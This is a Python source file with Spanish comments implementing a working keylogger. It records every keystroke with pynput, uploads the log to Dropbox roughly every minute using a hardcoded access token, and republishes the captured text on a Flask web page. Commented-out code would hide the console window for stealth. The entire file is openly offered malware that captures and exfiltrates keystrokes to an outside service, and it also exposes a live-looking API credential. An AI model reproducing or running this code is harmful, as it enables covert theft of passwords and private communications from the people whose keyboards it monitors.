import time
import datetime
from flask import Flask
from pynput.keyboard import Listener
import os
import dropbox
import win32console
import win32gui

#identificamos la ventana
#ventana=win32console.GetConsoleWindow()
#Solcitamos su cierre
#win32gui.ShowWindow(ventana,0)

def uploadDropbox():
    #indicar documento a subir
    file_from = 'Keylogger.txt'
    #Captura dato del tiempo
    d=datetime.datetime.now().strftime('%Y-%m-%d|%H:%M:%S')
    #Asignarle txto al namefile
    namefile = '{}.txt'.format(d)
    #Asignar direccion y nombre de doc en dropbox
    file_to = '/KeyloggerFile/Keylogger'+namefile
    #Autenticar acceso a dropbox a traves del token
    dbx = dropbox.Dropbox('9NBLXzfcRWAAAAAAAAAAAVmidmySbjapdB6MQhoBrTzbDAinLViRQMpKsvaCbygM')
    #Subir documento a la direccion indicada
    dbx.files_upload(open(file_from, 'rb').read(), file_to)

#creamos la carpeta templates que almacenara el index.html
if os.path.isdir('./templates/')!=True:
    os.mkdir('templates')

#crea y edita index.html
def publicarWeb(texto):
    web2 =  open("templates/index.html","w")
    html = web2.write("<p>")
    html = web2.write(texto)
    html = web2.write("</p>")   
    web2.close()

#crea el txt
file = open("Keylogger.txt", "w")

#Captura tiempo
inicio = time.time()

#captura de datos
def key_recorder(key):
    key = str(key)

    global inicio
    #Abre el txt en modo lectura
    file = open ("Keylogger.txt", "a")
    
    #Codificamos algunos keys
    if key == "Key.enter":
        file.write("Enter")
    elif key == "Key.space":
        file.write(" ")
    elif key == "Key.backspace":
        file.write("%BORRAR%")
    elif key == "'ñ'":
        file.write("<164>")
    else:
        file.write(key.replace("'", ""))

    #Pasado 10 segundos entonces
    if( time.time() - inicio) >60:
        #Ejecutar programa
        uploadDropbox()
        #Abrimos el txt en lectura
        file2 = open("Keylogger.txt")
        #Lo pasamos a un string y llamamos a la funcion
        publicarWeb(file2.read())
        #Renovamos la captura de inicio
        inicio = time.time()
with Listener(on_press=key_recorder) as l:
    l.join()